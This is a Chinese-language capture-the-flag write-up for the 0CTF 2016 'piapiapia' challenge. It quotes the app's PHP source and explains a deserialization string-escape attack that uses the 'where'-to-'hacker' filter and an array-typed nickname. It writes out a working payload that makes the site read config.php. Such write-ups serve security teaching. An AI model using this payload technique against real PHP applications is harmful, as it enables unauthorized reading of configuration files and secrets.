# [0CTF 2016]piapiapia

## 知识点

`php反序列化字符串逃逸(变长)`

`php代码审计`

## 解题

首先进入题目首页，只有一个登录框，扫目录的时候扫到了`www.zip`，看了下代码在`profile.php`发现有反序列化和读取文件，而且最后会将内容以`base64`编码输出

```php
<?php
	require_once('class.php');
	if($_SESSION['username'] == null) {
		die('Login First');
	}
	$username = $_SESSION['username'];
	$profile=$user->show_profile($username);
	if($profile  == null) {
		header('Location: update.php');
	}
	else {
		$profile = unserialize($profile);
		$phone = $profile['phone'];
		$email = $profile['email'];
		$nickname = $profile['nickname'];
		$photo = base64_encode(file_get_contents($profile['photo']));
?>
```

发现有反序列化，找一下如何利用，在`update.php`中找到利用方法
```php
<?php
	require_once('class.php');
	if($_SESSION['username'] == null) {
		die('Login First');
	}
	if($_POST['phone'] && $_POST['email'] && $_POST['nickname'] && $_FILES['photo']) {

		$username = $_SESSION['username'];
		if(!preg_match('/^\d{11}$/', $_POST['phone']))
			die('Invalid phone');

		if(!preg_match('/^[_a-zA-Z0-9]{1,10}@[_a-zA-Z0-9]{1,10}\.[_a-zA-Z0-9]{1,10}$/', $_POST['email']))
			die('Invalid email');

		if(preg_match('/[^a-zA-Z0-9_]/', $_POST['nickname']) || strlen($_POST['nickname']) > 10)
			die('Invalid nickname');

		$file = $_FILES['photo'];
		if($file['size'] < 5 or $file['size'] > 1000000)
			die('Photo size error');

		move_uploaded_file($file['tmp_name'], 'upload/' . md5($file['name']));
		$profile['phone'] = $_POST['phone'];
		$profile['email'] = $_POST['email'];
		$profile['nickname'] = $_POST['nickname'];
		$profile['photo'] = 'upload/' . md5($file['name']);

		$user->update_profile($username, serialize($profile));
		echo 'Update Profile Success!<a href="profile.php">Your Profile</a>';
	}
?>
```
发现`$profile['photo'] = 'upload/' . md5($file['name']);`，已经被固定，发现前面的参数`nickname`的`preg_match`可以用`数组传值`绕过，猜测通过`反序列化字符串逃逸`来攻击，找一下有没有能让字符串替换的地方，跟进`$user->update_profile($username, serialize($profile));`

```php
class User extends mysql {
    public function update_profile($username, $new_profile) {
		$username = parent::filter($username);
		$new_profile = parent::filter($new_profile);

		$where = "username = '$username'";
		return parent::update($this->table, 'profile', $new_profile, $where);
	}

    public function filter($string) {
		$escape = array('\'', '\\\\');
		$escape = '/' . implode('|', $escape) . '/';
		$string = preg_replace($escape, '_', $string);

		$safe = array('select', 'insert', 'update', 'delete', 'where');
		$safe = '/' . implode('|', $safe) . '/i';
		return preg_replace($safe, 'hacker', $string);
	}
}
```

发现传入`序列化`后的值字符串长度会增加，那么我们就可以进行`反序列化字符串逃逸(变长)`,先尝试读取`config.php`，构造`payload`

```php
<?php
$profile['phone'] = '13312345678';
$profile['email'] = '1@163.com';
$profile['nickname'] = ['123'];      // 数组绕过，所以构造数组，不然后续会少一个字符导致逃逸失败
$profile['photo'] = 'config.php';

echo serialize($profile);
```

可以参考[我以前的博客](https://cmacckk.github.io/2021/06/05/phpUnserialize/#php%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%AD%97%E7%AC%A6%E4%B8%B2%E9%80%83%E9%80%B8%E5%8F%98%E9%95%BF)

![alt text](<img/[0CTF 2016]piapiapia-3.png>)

可以看到，需要逃逸的字符串长度是`34`,从`where`变到`hacker`每次增加一个字符，所以需要`34`个`where`来拼接

![alt text](<img/[0CTF 2016]piapiapia-4.png>)

```
wherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewhere";}s:5:"photo";s:10:"config.php";}
```

然后`bp`传值之后到`index.php`的源码中找到`base64`值解码即可获得`config.php`文件的内容

![alt text](<img/[0CTF 2016]piapiapia-5.png>)

![alt text](<img/[0CTF 2016]piapiapia-6.png>)

![alt text](<img/[0CTF 2016]piapiapia-7.png>)

![alt text](<img/[0CTF 2016]piapiapia-8.png>)